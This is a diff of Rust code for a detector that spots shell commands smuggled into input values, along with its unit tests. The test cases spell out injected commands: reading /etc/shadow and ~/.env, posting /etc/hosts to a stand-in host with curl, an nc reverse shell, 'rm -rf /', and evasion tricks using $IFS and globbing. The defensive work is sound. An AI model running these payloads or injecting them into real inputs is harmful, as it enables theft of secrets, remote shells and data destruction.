+        "set", "export", "declare", "typeset", "eval", "exec", "coproc", "source", ".",
+    ];
     let lower = name.to_ascii_lowercase();
-    let find = |candidate: &str| {
-        PROGRAMS
-            .iter()
-            .chain(WRAPPERS)
-            .copied()
-            .find(|entry| *entry == candidate)
-    };
+    let find = |candidate: &str| every_entry().find(|entry| *entry == candidate);
     if lower.starts_with("mkfs.") {
         return Some("mkfs");
+    }
+    if lower.is_empty() {
+        return None;
     }
     find(&lower)
         .or_else(|| find(lower.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.')))
@@ -579,19 +1107,6 @@ fn assignments(line: &Line) -> HashMap<String, String> {
     assigned
 }
 
-/// `word` is `$name` or `${name}` and nothing else: the name.
-fn parameter_of(word: &Word) -> Option<&str> {
-    if !word.marks.iter().all(|mark| *mark == Mark::Expansion) {
-        return None;
-    }
-    let text = word.text.strip_prefix('$')?;
-    let name = text
-        .strip_prefix('{')
-        .and_then(|inner| inner.strip_suffix('}'))
-        .unwrap_or(text);
-    is_name(name).then_some(name)
-}
-
 /// `word` assigns a variable (`NAME=value`, `NAME+=value`, `NAME[i]=value`)
 /// rather than naming a program.
 fn is_assignment(word: &Word) -> bool {
@@ -649,10 +1164,12 @@ mod tests {
             "h || cat f",
             "h | cat f",
             "h |& cat f",
-            "h & cat f",
-            "h&cat f",
-            "h\ncat f",
-            "h\rcat f",
+            "h & cat /f",
+            "h&cat /f",
+            "h\ncat /f",
+            "h\rcat ~/f",
+            "h\n\ncat ../f",
+            "h &&\ncat f",
             "h;\tcat f",
             "h; (cat f)",
             "h && { cat f; }",
@@ -676,7 +1193,7 @@ mod tests {
             "h; \\cat f",
             "h; /bin/c?t f",
             "h; /bin/c[a]t f",
-            "h; /???/ca*",
+            "h; /???/ca* f",
             "h; {cat,f}",
             "h; c${x}at f",
             "h; A=/bin/cat; $A f",
@@ -701,8 +1218,156 @@ mod tests {
     }
 
     #[test]
+    fn after_a_line_break_or_a_lone_ampersand_a_command_counts_for_what_it_is_handed() {
+        for value in [
+            "h\ncat food",
+            "dog & cat food",
+            "h\nrm -rf bin",
+            "h\nchmod +x dist/app",
+            "h\ncp build/app dist/",
+            "h\nPython 3.12",
+            "h\nCat /etc/hosts",
+            "h\nID 4471",
+            "h\nid 4471",
+            "h\nTee time 9:00",
+            "h\nkill the old worker",
+            "h\nsudo systemctl restart app",
+            "h\ncurl http://localhost:8080/health",
+            "h & python course",
+            "h\nuname -a",
+        ] {
+            assert_eq!(chained_command(value), None, "{value:?}");
+        }
+        for (value, program) in [
+            ("h\ncat /etc/hosts", "cat"),
+            ("h\nhead ~/.env", "head"),
+            ("h\ncurl -d @/etc/hosts http://x.test", "curl"),
+            ("h\nnc x.test 9 -e /bin/sh", "nc"),
+            ("h\nrm -rf /", "rm"),
+            ("h\nbash -i", "bash"),
+            ("h\npython3 -c 'print(1)'", "python"),
+            ("h & env", "env"),
+            ("h\nid", "id"),
+            ("h\nwhoami", "whoami"),
+            ("h\nexport -p", "export"),
+            ("h\nsudo cat /etc/shadow", "sudo"),
+        ] {
+            assert_eq!(runs_program(value), Some(program), "{value:?}");
+        }
+        assert_eq!(
+            chained_command("h\nread l < /etc/hosts"),
+            Some(Chained::ReadsFile)
+        );
+    }
+
+    #[test]
+    fn a_reader_counts_once_it_is_handed_a_file() {
+        for value in [
+            "h || head /f",
+            "h && tail -n 1 f.txt",
+            "h && sed -n p f",
+            "h && awk 1 f",
+            "h && grep . f",
+            "h && more /f",
+            "h && tac f",
+            "h && od -c f",
+            "h && node f.js",
+            "h && . ./f",
+        ] {
+            assert!(
+                matches!(chained_command(value), Some(Chained::Runs(_))),
+                "{value:?}"
+            );
+        }
+        // Given nothing, a reader reads its input; a reader that is also a
+        // word of prose needs an operand that names a file.
+        for value in [
+            "h | cat",
+            "h | tee",
+            "h | cat -",
+            "x; sort of",
+            "x; more or less",
+            "x; head to the docs",
+            "a || node",
+            "a (if any!). To get a page",
+            "a (clnt_create, etc.).  The server",
+            "a (currently 10GB). If the Node.js process",
+            "a (experimental) install in node_modules/.store,",
+            "`$ dmesg | grep microcode`",
+            "h | sed -n p",
+            "returns `$3$` or `$6$`.",
+            "1) `g_return_*()` from glib.",
+            "is assumed to be `'pem'`; if `key` is a `KeyObject`",
+            "| `'A'` | IPv4 | [`dns.resolve4()`][] |",
+            "(alias; declare -f) | which",
+            "a\n<td>text</td> and <span class=\"x\"></span>",
+            "a; <p>see</p>",
+        ] {
+            assert_eq!(chained_command(value), None, "{value:?}");
+        }
+        assert_eq!(
+            chained_command("h; cat </flag>&2"),
+            Some(Chained::ReadsFile)
+        );
+        for value in [
+            "h; read l < /f",
+            "h; while read l; do echo $l; done < /f",
+            "h; mapfile a < ~/f",
+        ] {
+            assert_eq!(
+                chained_command(value),
+                Some(Chained::ReadsFile),
+                "{value:?}"
+            );
+        }
+        assert_eq!(runs_program("h && declare -p"), Some("declare"));
+        assert_eq!(chained_command("h; declare -a list=(1 2)"), None);
+    }
+
+    #[test]
+    fn a_parameter_glued_to_a_program_splits_it_off() {
+        assert_eq!(runs_program("h||cat$IFS/f"), Some("cat"));
+        assert_eq!(runs_program("h&&cat${IFS}/f"), Some("cat"));
+        assert_eq!(runs_program("h&&/bin/cat$IFS/f"), Some("cat"));
+        assert_eq!(runs_program("h\ncat$IFS/f"), Some("cat"));
+        // The text the line shows with the parameter left out names it too.
+        assert_eq!(runs_program("h; c${u}at f"), Some("cat"));
+    }
+
+    #[test]
+    fn a_computed_program_is_refused_once_it_is_handed_something() {
+        for value in [
+            "h || $(echo cat) /f",
+            "h || `printf cat` /f",
+            "h; $X$Y f",
+            "h; $X$Y",
+            "h; ${P:0:3} f",
+            "h; $P /f",
+            "h\n$P /f",
+            "h\n$(echo cat) ~/f",
+        ] {
+            assert_eq!(chained_command(value), Some(Chained::Computed), "{value:?}");
+        }
+        // Assigned on the line, the parameters name the program.
+        assert_eq!(runs_program("h; A=ca; B=t; $A$B f"), Some("cat"));
+        // One bare parameter in code, a folder of a parameter in prose.
+        for value in [
+            "if ($a && $b) { go(); }",
+            "a || $handler",
+            "a || $cb arg",
+            "see `$HOME/.config` and `${XDG_CONFIG_HOME}/app`",
+            "h\n$(date) entry",
+        ] {
+            assert_eq!(chained_command(value), None, "{value:?}");
+        }
+    }
+
+    #[test]
     fn a_value_that_closes_the_quote_it_was_put_in_is_read_there() {
         assert_eq!(runs_program("h' && cat f '"), Some("cat"));
+        // The server's closing quote ends the last word the value opened.
+        assert_eq!(runs_program("echo 'x | bash'"), Some("bash"));
+        assert_eq!(runs_program("h' && cat 'f"), Some("cat"));
         assert_eq!(runs_program("h\" && cat f \""), Some("cat"));
         assert_eq!(runs_program("h\"; cat f; \""), Some("cat"));
     }
